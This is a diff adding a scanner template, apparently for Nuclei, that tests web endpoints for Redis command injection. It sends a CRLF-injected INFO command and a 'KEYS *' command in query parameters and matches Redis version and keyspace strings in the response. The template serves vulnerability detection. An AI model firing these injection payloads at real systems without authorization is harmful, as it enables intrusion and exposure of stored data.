@@ -1,0 +1,23 @@
+id: nosqli-redis-command-injection
+info:
+  name: Redis NoSQL Command Injection
+  author: AniipID
+  severity: critical
+  description: Tests for Redis command injection through key/value manipulation
+  tags: nosqli,redis,injection,command
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?key=foo%0D%0AINFO"
+      - "{{BaseURL}}/?cmd=KEYS%20*"
+    headers:
+      Content-Type: application/json
+    matchers:
+      - type: word
+        words:
+          - "redis_version"
+          - "used_memory"
+          - "db0:keys="
+        condition: or
+        part: body
